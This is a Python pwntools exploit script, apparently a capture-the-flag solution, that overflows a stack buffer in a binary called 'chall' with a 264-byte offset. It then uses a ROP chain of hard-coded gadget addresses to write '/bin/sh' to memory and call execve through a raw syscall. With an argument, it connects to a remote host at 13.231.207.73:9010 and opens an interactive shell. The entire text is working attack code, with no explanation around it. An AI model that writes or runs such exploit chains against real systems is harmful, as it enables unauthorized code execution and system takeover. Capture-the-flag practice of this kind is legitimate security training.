from pwn import *
import sys

offset = 264
data_section = 0x604020

xor_eax_eax = 0x004023f7
mov_rsi_r12__syscall = 0x0040247a
pop_r12 = 0x0040245d
pop_rdx = 0x004023f5
pop_rax = 0x00400121
mov_qprdi_rax = 0x00400704
pop_rdi = 0x0040141c

if len(sys.argv) == 1:
    r = process("./chall")
    log.info("pid = {}".format(r.pid))
else:
    r = remote("13.231.207.73", 9010)

sleep(5)
    
# execve("/bin/sh", NULL, NULL)
payload = b"A" * offset

# rdi = "/bin/sh"
payload += p64(pop_rdi)
payload += p64(data_section)
payload += p64(pop_rax)
payload += b"/bin/sh\x00"
payload += p64(mov_qprdi_rax)

# rdx = 0
payload += p64(pop_rdx)
payload += p64(0)

# rax = 59
payload += p64(pop_rax)
payload += p64(59)

# rsi = 0, syscall
payload += p64(pop_r12)
payload += p64(0)
payload += p64(mov_rsi_r12__syscall)

r.sendline(payload)
r.interactive()
